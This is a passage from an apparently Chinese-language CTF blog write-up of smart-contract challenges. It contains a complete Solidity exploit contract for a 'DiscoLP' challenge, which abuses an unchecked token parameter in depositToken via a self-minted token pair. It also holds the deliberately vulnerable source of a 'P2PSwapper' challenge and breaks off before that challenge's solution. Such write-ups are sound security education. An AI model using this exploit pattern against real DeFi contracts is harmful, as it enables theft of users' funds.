class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Pair is PoolToken</span><br><span class="line">&#123;</span><br><span class="line">  function token0() external view returns (address _token0);</span><br><span class="line">  function token1() external view returns (address _token1);</span><br><span class="line">  function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);</span><br><span class="line">  function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);</span><br><span class="line">  function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);</span><br><span class="line">  function mint(address _to) external returns (uint256 _liquidity);</span><br><span class="line">  function sync() external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Anaylse"><a href="#Anaylse" class="headerlink" title="Anaylse"></a>Anaylse</h2><p>题目涉及流动性挖矿：<a href="https://www.zhihu.com/question/449221683">对流动性挖矿的解释</a></p><p>JIMBO:tokenA:1</p><p>JAMBO:tokenB:1</p><p>一个代币表示1*10**18</p><p>题目就是通过流动性挖矿产生disco token的收益,但是题目中的pair对不用一定是tokenA,B可以是tokenA与其他的自己创建的tokenC，因此tokenC的代币是自定义的。通过tokenA与tokenC或者tokenB与tokenC可以挖出超过100的DISCO流动性。因此漏洞在于调用depositeToken时没有检查传入的_token是否合法，从而造成了漏洞</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>Step</p><ol><li>step1:new MYERC20</li><li>step2:createpair(MYERC20,tokenA)</li><li>step3:Router.addLiquidity</li><li>step4:depositToken</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2Factory &#123;</span><br><span class="line">  event PairCreated(address indexed token0, address indexed token1, address pair, uint);</span><br><span class="line"></span><br><span class="line">  function getPair(address tokenA, address tokenB) external view returns (address pair);</span><br><span class="line">  function allPairs(uint) external view returns (address pair);</span><br><span class="line">  function allPairsLength() external view returns (uint);</span><br><span class="line"></span><br><span class="line">  function feeTo() external view returns (address);</span><br><span class="line">  function feeToSetter() external view returns (address);</span><br><span class="line"></span><br><span class="line">  function createPair(address tokenA, address tokenB) external returns (address pair);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2Router &#123;</span><br><span class="line">  function WETH() external pure returns (address _token);</span><br><span class="line">  function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);</span><br><span class="line">  function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);</span><br><span class="line">  function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);</span><br><span class="line">  function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);</span><br><span class="line">  function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Pair</span><br><span class="line">&#123;</span><br><span class="line">  function token0() external view returns (address _token0);</span><br><span class="line">  function token1() external view returns (address _token1);</span><br><span class="line">  function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);</span><br><span class="line">  function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);</span><br><span class="line">  function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);</span><br><span class="line">  function mint(address _to) external returns (uint256 _liquidity);</span><br><span class="line">  function sync() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface DiscoLP is IERC20 &#123;</span><br><span class="line">    function depositToken(address _token, uint256 _amount, uint256 _minShares) external;</span><br><span class="line">    function calcCostFromShares(uint256 _shares) external view returns (uint256);</span><br><span class="line">    function totalReserve() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library $</span><br><span class="line">&#123;</span><br><span class="line">  address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten</span><br><span class="line">  address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Token is ERC20 &#123;</span><br><span class="line">    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) public &#123;</span><br><span class="line">        _mint(msg.sender, 2**256 - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract attack&#123;</span><br><span class="line">  DiscoLP public target;</span><br><span class="line">  Token myerc;</span><br><span class="line">  constructor(address addr)&#123;</span><br><span class="line">    target=DiscoLP(addr);</span><br><span class="line">  &#125;</span><br><span class="line">  function Atta(address tokenA)external&#123;</span><br><span class="line">    myerc=new Token(&quot;jjk&quot;,&quot;jk&quot;);</span><br><span class="line">    myerc.approve($.UniswapV2_FACTORY,2**256 - 1);</span><br><span class="line">    myerc.approve($.UniswapV2_ROUTER02,2**256 - 1);</span><br><span class="line">    IERC20(tokenA).approve($.UniswapV2_ROUTER02,2**256 - 1);</span><br><span class="line">    address pair=IUniswapV2Factory($.UniswapV2_FACTORY).createPair(address(myerc),tokenA);</span><br><span class="line">    IUniswapV2Router($.UniswapV2_ROUTER02).addLiquidity(address(myerc),tokenA,10000000*10**18,1*10**18,1,1,address(this),9999999999999999999);</span><br><span class="line">    target.depositToken(address(myerc),10000000*10**18,100*10**18);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-P2PSwapper"><a href="#3-P2PSwapper" class="headerlink" title="3.P2PSwapper"></a>3.P2PSwapper</h1><h2 id="Request-2"><a href="#Request-2" class="headerlink" title="Request"></a>Request</h2><p>P2PSwapper is a super convenient zero-trust P2P DEX for any assets! The fee is flat so the whales are welcome! Also, we have a referral program, and all the fees are equally distributed between us and the lead owners.</p><p>We’ve created a sample trade and deposited some money for it. We wanna make sure you cannot withdraw the fees assigned for our trade.</p><p>You have to drain all the WETH tokens from the P2PSwapper’s balance.</p><h2 id="Source-Code-2"><a href="#Source-Code-2" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false</span><br><span class="line">library TransferHelper &#123;</span><br><span class="line">    function safeApprove(</span><br><span class="line">        address token,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        // bytes4(keccak256(bytes(&#x27;approve(address,uint256)&#x27;)));</span><br><span class="line">        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));</span><br><span class="line">        require(</span><br><span class="line">            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),</span><br><span class="line">            &#x27;TransferHelper::safeApprove: approve failed&#x27;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function safeTransfer(</span><br><span class="line">        address token,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        // bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;)));</span><br><span class="line">        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));</span><br><span class="line">        require(</span><br><span class="line">            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),</span><br><span class="line">            &#x27;TransferHelper::safeTransfer: transfer failed&#x27;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function safeTransferFrom(</span><br><span class="line">        address token,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        // bytes4(keccak256(bytes(&#x27;transferFrom(address,address,uint256)&#x27;)));</span><br><span class="line">        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));</span><br><span class="line">        require(</span><br><span class="line">            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),</span><br><span class="line">            &#x27;TransferHelper::transferFrom: transferFrom failed&#x27;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function safeTransferETH(address to, uint256 value) internal &#123;</span><br><span class="line">        (bool success, ) = to.call&#123;value: value&#125;(new bytes(0));</span><br><span class="line">        require(success, &#x27;TransferHelper::safeTransferETH: ETH transfer failed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">library SafeMath &#123;</span><br><span class="line">    function add(uint a, uint b) internal pure returns (uint c) &#123; c = a + b; require(c &gt;= a); &#125;</span><br><span class="line">    function sub(uint a, uint b) internal pure returns (uint c) &#123; require(a &gt;= b); c = a - b; &#125;</span><br><span class="line">    function mul(uint a, uint b) internal pure returns (uint c) &#123; c = a * b; require(a == 0 || c / a == b); &#125;</span><br><span class="line">    function div(uint a, uint b) internal pure returns (uint c) &#123; require(b &gt; 0); c = a / b; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract P2P_WETH &#123;</span><br><span class="line">    using SafeMath for uint;</span><br><span class="line">    string public name     = &quot;P2P SwapWrapped Ether&quot;;</span><br><span class="line">    string public symbol   = &quot;P2PETH&quot;;</span><br><span class="line">    uint8  public decimals = 18;</span><br><span class="line"></span><br><span class="line">    event  Approval(address indexed src, address indexed guy, uint wad);</span><br><span class="line">    event  Transfer(address indexed src, address indexed dst, uint wad);</span><br><span class="line">    event  Deposit(address indexed dst, uint wad);</span><br><span class="line">    event  Withdrawal(address indexed src, uint wad);</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint)                       public  balanceOf;</span><br><span class="line">    mapping (address =&gt; mapping (address =&gt; uint))  public  allowance;</span><br><span class="line">    </span><br><span class="line">    receive() payable external &#123;</span><br><span class="line">        deposit();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balanceOf[msg.sender] = balanceOf[msg.sender].add(msg.value);</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(</span><br><span class="line">        uint wad</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= wad);</span><br><span class="line">        balanceOf[msg.sender] = balanceOf[msg.sender].sub(wad);</span><br><span class="line">        payable(msg.sender).transfer(wad);</span><br><span class="line">        emit Withdrawal(msg.sender, wad);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function totalSupply() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(</span><br><span class="line">        address guy,</span><br><span class="line">        uint wad</span><br><span class="line">    ) public returns (bool) &#123;</span><br><span class="line">        allowance[msg.sender][guy] = wad;</span><br><span class="line">        emit Approval(msg.sender, guy, wad);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(</span><br><span class="line">        address dst,</span><br><span class="line">        uint wad</span><br><span class="line">    ) public returns (bool) &#123;</span><br><span class="line">        return transferFrom(msg.sender, dst, wad);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address src,</span><br><span class="line">        address dst,</span><br><span class="line">        uint wad</span><br><span class="line">    ) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[src] &gt;= wad);</span><br><span class="line">        if (src != msg.sender &amp;&amp; allowance[src][msg.sender] != uint(2 ** 256-1 )) &#123;</span><br><span class="line">            require(allowance[src][msg.sender] &gt;= wad);</span><br><span class="line">            allowance[src][msg.sender] -= wad;</span><br><span class="line">        &#125;</span><br><span class="line">        balanceOf[src] = balanceOf[src].sub(wad);</span><br><span class="line">        balanceOf[dst] = balanceOf[dst].add(wad);</span><br><span class="line">        emit Transfer(src, dst, wad);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IP2P_WETH &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function transfer(address to, uint value) external returns (bool);</span><br><span class="line">    function withdraw(uint) external;</span><br><span class="line">    function balanceOf(address) external returns (uint);</span><br><span class="line">    function approve(address,uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract P2PSwapper &#123;</span><br><span class="line">    using SafeMath for uint;</span><br><span class="line">    </span><br><span class="line">    struct Deal &#123;</span><br><span class="line">        address initiator;</span><br><span class="line">        address bidToken;</span><br><span class="line">        uint bidPrice;</span><br><span class="line">        address askToken;</span><br><span class="line">        uint askAmount;</span><br><span class="line">        uint status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    enum DealState &#123;</span><br><span class="line">        Active,</span><br><span class="line">        Succeeded,</span><br><span class="line">        Canceled,</span><br><span class="line">        Withdrawn</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event NewUser(address user, uint id, uint partnerId);</span><br><span class="line">    event WithdrawFees(address partner, uint userId, uint amount);</span><br><span class="line">    event NewDeal(address bidToken, uint bidPrice, address askToken, uint askAmount, uint dealId);</span><br><span class="line">    event TakeDeal(uint dealId, address bidder);</span><br><span class="line">    event CancelDeal(uint dealId);</span><br><span class="line"></span><br><span class="line">    uint public dealCount;</span><br><span class="line">    mapping(uint =&gt; Deal) public deals;</span><br><span class="line">    mapping(address =&gt; uint[]) private _dealHistory;</span><br><span class="line">    </span><br><span class="line">    uint public userCount;</span><br><span class="line">    mapping(uint =&gt; uint) public partnerFees;</span><br><span class="line">    mapping(address =&gt; uint) public distributedFees;</span><br><span class="line">    mapping(uint =&gt; uint) public partnerById;</span><br><span class="line">    mapping(address =&gt; uint) public userByAddress;</span><br><span class="line">    mapping(uint =&gt; address) public addressById;</span><br><span class="line"></span><br><span class="line">    IP2P_WETH public immutable p2pweth;</span><br><span class="line"></span><br><span class="line">    constructor(address weth) public &#123;</span><br><span class="line">        p2pweth = IP2P_WETH(weth);</span><br><span class="line"></span><br><span class="line">        userByAddress[msg.sender] = 1;</span><br><span class="line">        addressById[1] = msg.sender;</span><br><span class="line">        partnerById[1] = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bool private entered = false;</span><br><span class="line">    modifier nonReentrant() &#123;</span><br><span class="line">        require(entered == false, &#x27;P2PSwapper: re-entrancy detected!&#x27;);</span><br><span class="line">        entered = true;</span><br><span class="line">        _;</span><br><span class="line">        entered = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createDeal(</span><br><span class="line">        address bidToken,</span><br><span class="line">        uint bidPrice,</span><br><span class="line">        address askToken,</span><br><span class="line">        uint askAmount</span><br><span class="line">    ) external payable returns (uint dealId) &#123;</span><br><span class="line">        uint fee = msg.value;</span><br><span class="line">        require(fee &gt; 31337, &quot;P2PSwapper: fee too low&quot;);</span><br><span class="line">        p2pweth.deposit&#123;value: msg.value&#125;();</span><br><span class="line">        partnerFees[userByAddress[msg.sender]] = partnerFees[userByAddress[msg.sender]].add(fee.div(2));</span><br><span class="line"></span><br><span class="line">        TransferHelper.safeTransferFrom(bidToken, msg.sender, address(this), bidPrice);</span><br><span class="line">        dealId = _createDeal(bidToken, bidPrice, askToken, askAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function takeDeal(</span><br><span class="line">        uint dealId</span><br><span class="line">    ) external nonReentrant &#123;</span><br><span class="line">        require(dealCount &gt;= dealId &amp;&amp; dealId &gt; 0, &quot;P2PSwapper: deal not found&quot;);</span><br><span class="line"></span><br><span class="line">        Deal storage deal = deals[dealId];</span><br><span class="line">        require(deal.status == 0, &quot;P2PSwapper: deal not available&quot;);</span><br><span class="line"></span><br><span class="line">        TransferHelper.safeTransferFrom(deal.askToken, msg.sender, deal.initiator, deal.askAmount);</span><br><span class="line">        _takeDeal(dealId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cancelDeal(</span><br><span class="line">        uint dealId</span><br><span class="line">    ) external nonReentrant &#123; </span><br><span class="line">        require(dealCount &gt;= dealId &amp;&amp; dealId &gt; 0, &quot;P2PSwapper: deal not found&quot;);</span><br><span class="line">        </span><br><span class="line">        Deal storage deal = deals[dealId];</span><br><span class="line">        require(deal.initiator == msg.sender, &quot;P2PSwapper: access denied&quot;);</span><br><span class="line"></span><br><span class="line">        TransferHelper.safeTransfer(deal.bidToken, msg.sender, deal.bidPrice);</span><br><span class="line">        </span><br><span class="line">        deal.status = 2;</span><br><span class="line">        emit CancelDeal(dealId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function status(</span><br><span class="line">        uint dealId</span><br><span class="line">    ) public view returns (DealState) &#123;</span><br><span class="line">        require(dealCount &gt;= dealId &amp;&amp; dealId &gt; 0, &quot;P2PSwapper: deal not found&quot;);</span><br><span class="line">        Deal storage deal = deals[dealId];</span><br><span class="line">        if (deal.status == 1) &#123;</span><br><span class="line">            return DealState.Succeeded;</span><br><span class="line">        &#125; else if (deal.status == 2 || deal.status == 3) &#123;</span><br><span class="line">            return DealState(deal.status);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return DealState.Active;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function dealHistory(</span><br><span class="line">        address user</span><br><span class="line">    ) public view returns (uint[] memory) &#123;</span><br><span class="line">        return _dealHistory[user];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function signup() public returns (uint) &#123;</span><br><span class="line">        return signup(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function signup(uint partnerId) public returns (uint id) &#123;</span><br><span class="line">        require(userByAddress[msg.sender] == 0, &quot;P2PSwapper: user exists&quot;);</span><br><span class="line">        require(addressById[partnerId] != address(0), &quot;P2PSwapper: partner not found&quot;);</span><br><span class="line">        </span><br><span class="line">        id = ++userCount;</span><br><span class="line">        userByAddress[msg.sender] = id;</span><br><span class="line">        addressById[id] = msg.sender;</span><br><span class="line">        partnerById[id] = partnerId;</span><br><span class="line"></span><br><span class="line">        emit NewUser(msg.sender, id, partnerId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawFees(address user) public nonReentrant returns (uint fees) &#123;</span><br><span class="line">        uint userId = userByAddress[user];</span><br><span class="line">        require(partnerById[userId] == userByAddress[msg.sender], &quot;P2PSwapper: user is not your referral&quot;);</span><br><span class="line">        </span><br><span class="line">        fees = partnerFees[userId].sub(distributedFees[user]);</span><br><span class="line">        require(fees &gt; 0, &quot;P2PSwapper: no fees to distribute&quot;);</span><br><span class="line"></span><br><span class="line">        distributedFees[user] = distributedFees[user].add(fees);</span><br><span class="line">        p2pweth.withdraw(fees);</span><br><span class="line">        TransferHelper.safeTransferETH(msg.sender, fees);</span><br><span class="line"></span><br><span class="line">        emit WithdrawFees(msg.sender, userId, fees);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _createDeal(</span><br><span class="line">        address bidToken,</span><br><span class="line">        uint bidPrice,</span><br><span class="line">        address askToken,</span><br><span class="line">        uint askAmount</span><br><span class="line">    ) private returns (uint dealId) &#123; </span><br><span class="line">        require(askToken != address(0), &quot;P2PSwapper: invalid address&quot;);</span><br><span class="line">        require(bidPrice &gt; 0, &quot;P2PSwapper: invalid bid price&quot;);</span><br><span class="line">        require(askAmount &gt; 0, &quot;P2PSwapper: invalid ask amount&quot;);</span><br><span class="line">        dealId = ++dealCount;</span><br><span class="line">        Deal storage deal = deals[dealId];</span><br><span class="line">        deal.initiator = msg.sender;</span><br><span class="line">        deal.bidToken = bidToken;</span><br><span class="line">        deal.bidPrice = bidPrice;</span><br><span class="line">        deal.askToken = askToken;</span><br><span class="line">        deal.askAmount = askAmount;</span><br><span class="line">        </span><br><span class="line">        _dealHistory[msg.sender].push(dealId);</span><br><span class="line">        </span><br><span class="line">        emit NewDeal(bidToken, bidPrice, askToken, askAmount, dealId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _takeDeal(</span><br><span class="line">        uint dealId</span><br><span class="line">    ) private &#123; </span><br><span class="line">        Deal storage deal = deals[dealId];</span><br><span class="line"></span><br><span class="line">        TransferHelper.safeTransfer(deal.bidToken, msg.sender, deal.bidPrice);</span><br><span class="line"></span><br><span class="line">        deal.status = 1;</span><br><span class="line">        emit TakeDeal(dealId, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.sender == 